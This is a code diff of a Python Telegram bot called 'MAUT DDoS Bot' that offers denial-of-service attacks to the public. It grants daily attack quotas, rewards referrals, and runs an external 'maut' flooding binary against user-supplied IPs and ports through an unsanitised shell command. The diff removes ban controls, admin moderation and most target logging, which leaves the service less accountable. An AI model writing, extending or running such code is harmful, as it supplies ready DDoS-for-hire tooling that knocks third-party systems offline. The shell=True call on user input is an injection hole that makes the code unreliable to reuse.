@@ -29,13 +29,10 @@ def init_db():
     # Create users table
     cursor.execute('''CREATE TABLE IF NOT EXISTS users 
                      (user_id TEXT PRIMARY KEY, 
-                      username TEXT,
                       attacks_today INTEGER DEFAULT 0, 
                       last_attack_date TEXT,
                       total_attacks INTEGER DEFAULT 0,
-                      invites INTEGER DEFAULT 0,
-                      is_banned INTEGER DEFAULT 0,
-                      join_date TEXT)''')
+                      invites INTEGER DEFAULT 0)''')
     
     # Create cooldown table
     cursor.execute('''CREATE TABLE IF NOT EXISTS cooldown 
@@ -46,9 +43,7 @@ def init_db():
     cursor.execute('''CREATE TABLE IF NOT EXISTS active_attacks 
                      (user_id TEXT PRIMARY KEY,
                       start_time TEXT,
-                      duration INTEGER,
-                      target TEXT,
-                      port INTEGER)''')
+                      duration INTEGER)''')
     
     # Create referrals table
     cursor.execute('''CREATE TABLE IF NOT EXISTS referrals
@@ -61,73 +56,74 @@ def init_db():
 
 # Database helper functions
 def db_execute(query, params=(), fetch=False):
-    conn = None
-    try:
-        conn = sqlite3.connect(DB_FILE)
-        cursor = conn.cursor()
-        cursor.execute(query, params)
-        if fetch:
-            result = cursor.fetchall()
-        else:
-            result = None
-        conn.commit()
-        return result
-    except sqlite3.Error as e:
-        print(f"Database error: {e}")
-        return None
-    finally:
-        if conn:
-            conn.close()
+    conn = sqlite3.connect(DB_FILE)
+    cursor = conn.cursor()
+    cursor.execute(query, params)
+    if fetch:
+        result = cursor.fetchall()
+    else:
+        result = None
+    conn.commit()
+    conn.close()
+    return result
 
 def get_user(user_id):
     result = db_execute("SELECT * FROM users WHERE user_id=?", (user_id,), fetch=True)
     return result[0] if result else None
 
 def create_user(user_id):
-    try:
-        user = bot.get_chat(user_id)
-        username = user.username if user.username else None
-        db_execute("INSERT OR IGNORE INTO users (user_id, username, attacks_today, last_attack_date, join_date) VALUES (?, ?, 0, ?, ?)", 
-                  (user_id, username, datetime.date.today().isoformat(), datetime.datetime.now().isoformat()))
-        return True
-    except Exception as e:
-        print(f"Error creating user: {e}")
-        return False
+    db_execute("INSERT OR IGNORE INTO users (user_id, attacks_today, last_attack_date) VALUES (?, 0, ?)", 
+               (user_id, datetime.date.today().isoformat()))
 
 def log_attack(user_id, target, port, time):
     try:
-        user = get_user(user_id)
-        username = f"@{user[1]}" if user and user[1] else f"ID:{user_id}"
-        log_entry = f"{datetime.datetime.now()} | {username} | {target}:{port} | {time}s\n"
-        
+        user = bot.get_chat(user_id)
+        username = f"@{user.username}" if user.username else f"ID:{user_id}"
         with open(LOG_FILE, "a") as f:
-            f.write(log_entry)
-        return True
+            f.write(f"{datetime.datetime.now()} | {username} | {target}:{port} | {time}s\n")
     except Exception as e:
         print(f"Logging error: {e}")
-        return False
+
+def parse_time_input(time_str):
+    time_str = time_str.lower()
+    total_seconds = 0
+    
+    matches = re.findall(r'(\d+)\s*(day|hour|min|sec|d|h|m|s)', time_str)
+    
+    for amount, unit in matches:
+        amount = int(amount)
+        if unit in ['day', 'd']:
+            total_seconds += amount * 86400
+        elif unit in ['hour', 'h']:
+            total_seconds += amount * 3600
+        elif unit in ['min', 'm']:
+            total_seconds += amount * 60
+        elif unit in ['sec', 's']:
+            total_seconds += amount
+    
+    return total_seconds if total_seconds > 0 else None
 
 def is_attack_active():
     result = db_execute("SELECT COUNT(*) FROM active_attacks", fetch=True)
     return result[0][0] > 0 if result else False
 
-def add_active_attack(user_id, attack_time, target, port):
-    db_execute("INSERT INTO active_attacks (user_id, start_time, duration, target, port) VALUES (?, ?, ?, ?, ?)",
-              (user_id, datetime.datetime.now().isoformat(), attack_time, target, port))
+def add_active_attack(user_id, attack_time):
+    db_execute("INSERT INTO active_attacks (user_id, start_time, duration) VALUES (?, ?, ?)",
+               (user_id, datetime.datetime.now().isoformat(), attack_time))
 
 def remove_active_attack(user_id):
     db_execute("DELETE FROM active_attacks WHERE user_id=?", (user_id,))
 
 def get_active_attack_info():
-    result = db_execute("SELECT user_id, start_time, duration, target, port FROM active_attacks LIMIT 1", fetch=True)
+    result = db_execute("SELECT user_id, start_time, duration FROM active_attacks LIMIT 1", fetch=True)
     if not result:
         return None
     
-    user_id, start_time_str, duration, target, port = result[0]
+    user_id, start_time_str, duration = result[0]
     start_time = datetime.datetime.fromisoformat(start_time_str)
     elapsed = (datetime.datetime.now() - start_time).seconds
     remaining = max(0, duration - elapsed)
-    return user_id, remaining, target, port
+    return user_id, remaining
 
 def get_user_attack_count(user_id):
     user = get_user(user_id)
@@ -136,12 +132,12 @@ def get_user_attack_count(user_id):
     
     # Reset daily count if it's a new day
     today = datetime.date.today().isoformat()
-    if user[3] != today:
+    if user[2] != today:
         db_execute("UPDATE users SET attacks_today=0, last_attack_date=? WHERE user_id=?", 
-                 (today, user_id))
+                  (today, user_id))
         return 0
     
-    return user[2]
+    return user[1]
 
 def increment_attack_count(user_id):
     today = datetime.date.today().isoformat()
@@ -155,7 +151,7 @@ def increment_attack_count(user_id):
 def set_cooldown(user_id):
     cooldown_end = (datetime.datetime.now() + datetime.timedelta(seconds=COOLDOWN_TIME)).isoformat()
     db_execute("INSERT OR REPLACE INTO cooldown (user_id, cooldown_end) VALUES (?, ?)", 
-              (user_id, cooldown_end))
+               (user_id, cooldown_end))
 
 def is_on_cooldown(user_id):
     result = db_execute("SELECT cooldown_end FROM cooldown WHERE user_id=?", (user_id,), fetch=True)
@@ -213,16 +209,15 @@ def get_user_stats(user_id):
         return None
     
     today = datetime.date.today().isoformat()
-    attacks_remaining = max(0, MAX_DAILY_ATTACKS + (user[5] * ATTACKS_PER_INVITE) - user[2]) if user[3] == today else MAX_DAILY_ATTACKS + (user[5] * ATTACKS_PER_INVITE)
-    invites = user[5]
+    attacks_remaining = max(0, MAX_DAILY_ATTACKS - user[1]) if user[2] == today else MAX_DAILY_ATTACKS
+    invites = user[4]
     
     return {
-        'attacks_today': user[2],
+        'attacks_today': user[1],
         'attacks_remaining': attacks_remaining,
-        'total_attacks': user[4],
+        'total_attacks': user[3],
         'invites': invites,
-        'bonus_attacks': invites * ATTACKS_PER_INVITE,
-        'is_banned': user[6]
+        'bonus_attacks': invites * ATTACKS_PER_INVITE
     }
 
 def check_channel_membership(user_id):
@@ -246,38 +241,24 @@ def send_channel_join_message(chat_id):
         reply_markup=markup
     )
 
-def is_admin(user_id):
-    return str(user_id) in admin_id
-
 def check_membership_wrapper(func):
     def wrapped(message):
         user_id = str(message.chat.id)
-        
-        # Skip check for admins
-        if is_admin(user_id):
-            return func(message)
-            
         if not check_channel_membership(user_id):
-            return send_channel_join_message(message.chat.id)
+            send_channel_join_message(message.chat.id)
+            return
         return func(message)
     return wrapped
 
-def admin_required(func):
-    def wrapped(message):
-        if not is_admin(message.chat.id):
-            return bot.reply_to(message, "❌ Admin access required.")
-        return func(message)
-    return wrapped
-
-# User commands
 @bot.message_handler(commands=['start'])
 def start_command(message):
     user_id = str(message.chat.id)
     create_user(user_id)  # Ensure user exists
     
-    # Check channel membership first (skip for admins)
-    if not is_admin(user_id) and not check_channel_membership(user_id):
-        return send_channel_join_message(message.chat.id)
+    # Always check channel membership first
+    if not check_channel_membership(user_id):
+        send_channel_join_message(message.chat.id)
+        return
     
     # Check for referral
     referral_success = False
@@ -287,7 +268,7 @@ def start_command(message):
             referral_success = add_referral(referrer_id, user_id)
     
     caption = """
-🚀 *Welcome to MAUT DDoS Bot* 🚀
+🚀 *Welcome to MAUT DDoS Bot* �
 
 *Public Access Features:*
 - 10 free attacks per day
@@ -337,21 +318,16 @@ def handle_attack_command(message):
     user_id = str(message.chat.id)
     create_user(user_id)  # Ensure user exists
     
-    # Check if user is banned
-    stats = get_user_stats(user_id)
-    if stats and stats['is_banned']:
-        return bot.reply_to(message, "❌ You are banned from using this bot.")
-    
     # Check if another attack is active
     active_info = get_active_attack_info()
     if active_info:
-        active_user_id, remaining, target, port = active_info
+        active_user_id, remaining = active_info
         try:
-            active_user = get_user(active_user_id)
-            username = f"@{active_user[1]}" if active_user and active_user[1] else f"ID:{active_user_id}"
-            return bot.reply_to(message, f"⚠️ Attack in progress by {username} on {target}:{port}. Please wait {remaining} seconds.")
+            active_user = bot.get_chat(active_user_id)
+            username = f"@{active_user.username}" if active_user.username else f"ID:{active_user_id}"
+            return bot.reply_to(message, f"⚠️ Attack in progress by {username}. Please wait {remaining} seconds.")
         except:
-            return bot.reply_to(message, f"⚠️ Attack in progress on {target}:{port}. Please wait {remaining} seconds.")
+            return bot.reply_to(message, f"⚠️ Attack in progress. Please wait {remaining} seconds.")
     
     # Check cooldown
     if is_on_cooldown(user_id):
@@ -361,7 +337,7 @@ def handle_attack_command(message):
     # Check daily attack limit
     stats = get_user_stats(user_id)
     if stats['attacks_remaining'] <= 0:
-        return bot.reply_to(message, f"❌ Daily limit reached (10 attacks + {stats['bonus_attacks']} bonus). Invite friends for more attacks (/invite).")
+        return bot.reply_to(message, f"❌ Daily limit reached (10 attacks). Invite friends for more attacks (/invite).")
     
     # Parse command
     try:
@@ -408,12 +384,18 @@ def handle_attack_command(message):
 def handle_buttons(call):
     user_id = str(call.from_user.id)
     
+    # First check channel membership for all callbacks
+    if not check_channel_membership(user_id):
+        bot.answer_callback_query(call.id, "❌ Please join our channel first!", show_alert=True)
+        send_channel_join_message(call.message.chat.id)
+        return
+    
     if call.data.startswith("start_attack"):
         _, ip, port, attack_time = call.data.split("|")
         
         try:
             # Mark attack as active
-            add_active_attack(user_id, int(attack_time), ip, port)
+            add_active_attack(user_id, int(attack_time))
             
             # Execute attack
             subprocess.Popen(f"./maut {ip} {port} {attack_time} 900", shell=True)
@@ -483,8 +465,6 @@ def show_stats(message):
     if not stats:
         return bot.reply_to(message, "❌ Error getting stats.")
     
-    ban_status = "❌ (Banned)" if stats['is_banned'] else "✅ (Active)"
-    
     response = f"""
 📊 *Your Stats* 📊
 
@@ -493,7 +473,6 @@ def show_stats(message):
 • Total attacks: {stats['total_attacks']}
 • Friends invited: {stats['invites']}
 • Bonus attacks earned: {stats['bonus_attacks']}
-• Account status: {ban_status}
 
 Use /invite to get more attacks!
 """
@@ -577,243 +556,38 @@ Violations will result in ban.
 """
     bot.reply_to(message, rules, parse_mode="Markdown")
 
-# Admin commands
+# Admin commands (hidden from public)
 @bot.message_handler(commands=['admin'])
-@admin_required
-def admin_menu(message):
-    markup = types.InlineKeyboardMarkup(row_width=2)
-    markup.add(
-        types.InlineKeyboardButton("📊 Stats", callback_data="admin_stats"),
-        types.InlineKeyboardButton("👤 User Info", callback_data="admin_userinfo"),
-        types.InlineKeyboardButton("⏳ Active Attack", callback_data="admin_active"),
-        types.InlineKeyboardButton("🔨 Ban User", callback_data="admin_ban"),
-        types.InlineKeyboardButton("✅ Unban User", callback_data="admin_unban"),
-        types.InlineKeyboardButton("📜 Logs", callback_data="admin_logs")
-    )
+def admin_stats(message):
+    user_id = str(message.chat.id)
+    if user_id not in admin_id:
+        return
     
-    bot.reply_to(message, "👑 *Admin Panel* 👑", reply_markup=markup, parse_mode="Markdown")
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
-def admin_callback_handler(call):
-    if call.data == "admin_stats":
-        admin_stats_command(call)
-    elif call.data == "admin_userinfo":
-        bot.answer_callback_query(call.id, "Enter user ID after /userinfo command")
-    elif call.data == "admin_active":
-        admin_active_command(call)
-    elif call.data == "admin_ban":
-        bot.answer_callback_query(call.id, "Enter user ID after /ban command")
-    elif call.data == "admin_unban":
-        bot.answer_callback_query(call.id, "Enter user ID after /unban command")
-    elif call.data == "admin_logs":
-        admin_logs_command(call)
-
-def admin_stats_command(call=None, message=None):
     total_users = db_execute("SELECT COUNT(*) FROM users", fetch=True)[0][0]
     today_attacks = db_execute("SELECT SUM(attacks_today) FROM users WHERE last_attack_date=?", 
-                             (datetime.date.today().isoformat(),), fetch=True)[0][0] or 0
+                              (datetime.date.today().isoformat(),), fetch=True)[0][0] or 0
     total_attacks = db_execute("SELECT SUM(total_attacks) FROM users", fetch=True)[0][0] or 0
     total_referrals = db_execute("SELECT COUNT(*) FROM referrals", fetch=True)[0][0]
-    banned_users = db_execute("SELECT COUNT(*) FROM users WHERE is_banned=1", fetch=True)[0][0]
-    
-    active_info = get_active_attack_info()
-    active_status = "No active attacks"
-    if active_info:
-        user_id, remaining, target, port = active_info
-        user = get_user(user_id)
-        username = f"@{user[1]}" if user and user[1] else f"ID:{user_id}"
-        active_status = f"By {username} on {target}:{port} ({remaining}s left)"
     
     response = f"""
 👑 *Admin Stats* 👑
 
 • Total users: {total_users}
-• Banned users: {banned_users}
 • Attacks today: {today_attacks}
 • Total attacks: {total_attacks}
 • Total referrals: {total_referrals}
-• Active attack: {active_status}
-• Bot uptime: {get_uptime()}
+• Active attacks: {"Yes" if is_attack_active() else "No"}
 """
-
-    if call:
-        bot.edit_message_text(
-            chat_id=call.message.chat.id,
-            message_id=call.message.message_id,
-            text=response,
-            parse_mode="Markdown"
-        )
-    elif message:
-        bot.reply_to(message, response, parse_mode="Markdown")
-
-def admin_active_command(call):
-    active_info = get_active_attack_info()
-    if not active_info:
-        bot.answer_callback_query(call.id, "No active attacks")
-        return
-    
-    user_id, remaining, target, port = active_info
-    user = get_user(user_id)
-    username = f"@{user[1]}" if user and user[1] else f"ID:{user_id}"
-    
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("🛑 Stop Attack", callback_data=f"admin_stopattack|{user_id}"))
-    
-    bot.edit_message_text(
-        chat_id=call.message.chat.id,
-        message_id=call.message.message_id,
-        text=f"⚡ *Active Attack* ⚡\n\n"
-             f"👤 User: {username}\n"
-             f"🎯 Target: {target}:{port}\n"
-             f"⏱ Time left: {remaining}s\n\n"
-             f"Options:",
-        parse_mode="Markdown",
-        reply_markup=markup
-    )
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_stopattack|'))
-def admin_stop_attack(call):
-    user_id = call.data.split('|')[1]
-    
-    # Kill the attack process (implementation depends on your setup)
-    try:
-        subprocess.run("pkill -f maut", shell=True)
-    except:
-        pass
-    
-    remove_active_attack(user_id)
-    bot.answer_callback_query(call.id, "Attack stopped")
-    admin_stats_command(call)
-
-def admin_logs_command(call):
-    if not os.path.exists(LOG_FILE):
-        bot.answer_callback_query(call.id, "No logs available")
-        return
-    
-    try:
-        with open(LOG_FILE, "rb") as f:
-            bot.send_document(
-                chat_id=call.message.chat.id,
-                document=f,
-                caption="📜 Attack Logs"
-            )
-        bot.answer_callback_query(call.id, "Logs sent")
-    except Exception as e:
-        bot.answer_callback_query(call.id, f"Error: {str(e)}")
-
-@bot.message_handler(commands=['userinfo'])
-@admin_required
-def user_info_command(message):
-    try:
-        if len(message.text.split()) < 2:
-            return bot.reply_to(message, "Usage: /userinfo <user_id>")
-        
-        user_id = message.text.split()[1]
-        user = get_user(user_id)
-        if not user:
-            return bot.reply_to(message, "User not found")
-        
-        stats = get_user_stats(user_id)
-        
-        response = f"""
-👤 *User Info* 👤
-
-🆔 ID: `{user_id}`
-👤 Username: @{user[1] if user[1] else 'N/A'}
-📅 Joined: {user[7]}
-🚀 Total attacks: {stats['total_attacks']}
-👥 Invites: {stats['invites']}
-🔨 Status: {"Banned ❌" if stats['is_banned'] else "Active ✅"}
-"""
-        bot.reply_to(message, response, parse_mode="Markdown")
-    except Exception as e:
-        bot.reply_to(message, f"Error: {str(e)}")
-
-@bot.message_handler(commands=['ban'])
-@admin_required
-def ban_user_command(message):
-    try:
-        if len(message.text.split()) < 2:
-            return bot.reply_to(message, "Usage: /ban <user_id>")
-        
-        user_id = message.text.split()[1]
-        if user_id in admin_id:
-            return bot.reply_to(message, "Cannot ban admin")
-            
-        db_execute("UPDATE users SET is_banned=1 WHERE user_id=?", (user_id,))
-        bot.reply_to(message, f"User {user_id} banned successfully")
-    except Exception as e:
-        bot.reply_to(message, f"Error: {str(e)}")
-
-@bot.message_handler(commands=['unban'])
-@admin_required
-def unban_user_command(message):
-    try:
-        if len(message.text.split()) < 2:
-            return bot.reply_to(message, "Usage: /unban <user_id>")
-        
-        user_id = message.text.split()[1]
-        db_execute("UPDATE users SET is_banned=0 WHERE user_id=?", (user_id,))
-        bot.reply_to(message, f"User {user_id} unbanned successfully")
-    except Exception as e:
-        bot.reply_to(message, f"Error: {str(e)}")
-
-@bot.message_handler(commands=['broadcast'])
-@admin_required
-def broadcast_command(message):
-    try:
-        if len(message.text.split()) < 2:
-            return bot.reply_to(message, "Usage: /broadcast <message>")
-        
-        text = ' '.join(message.text.split()[1:])
-        users = db_execute("SELECT user_id FROM users", fetch=True)
-        
-        if not users:
-            return bot.reply_to(message, "No users to broadcast to")
-        
-        success = 0
-        failed = 0
-        
-        for user in users:
-            try:
-                bot.send_message(user[0], f"📢 *Admin Broadcast*\n\n{text}", parse_mode="Markdown")
-                success += 1
-            except:
-                failed += 1
-            time.sleep(0.1)  # Rate limiting
-        
-        bot.reply_to(message, f"Broadcast complete:\nSuccess: {success}\nFailed: {failed}")
-    except Exception as e:
-        bot.reply_to(message, f"Error: {str(e)}")
-
-# Uptime tracking
-start_time = datetime.datetime.now()
-
-def get_uptime():
-    delta = datetime.datetime.now() - start_time
-    hours, remainder = divmod(delta.seconds, 3600)
-    minutes, seconds = divmod(remainder, 60)
-    return f"{delta.days}d {hours}h {minutes}m {seconds}s"
+    bot.reply_to(message, response, parse_mode="Markdown")
 
 # Initialize database
 init_db()
 
-# Error handler
-@bot.message_handler(func=lambda message: True)
-def error_handler(message):
-    if message.text.startswith('/'):
-        bot.reply_to(message, "❌ Unknown command. Use /help for available commands.")
-
-# Start bot with error handling
-def run_bot():
-    print("⚡ MAUT Bot Started ⚡")
-    while True:
-        try:
-            bot.polling(none_stop=True)
-        except Exception as e:
-            print(f"Bot crashed: {e}")
-            time.sleep(5)
-            continue
-
-if __name__ == '__main__':
-    run_bot()
+# Start bot
+print("⚡ MAUT Bot Started ⚡")
+while True:
+    try:
+        bot.polling(none_stop=True)
+    except Exception as e:
+        print(f"Error: {e}")
+        time.sleep(5)
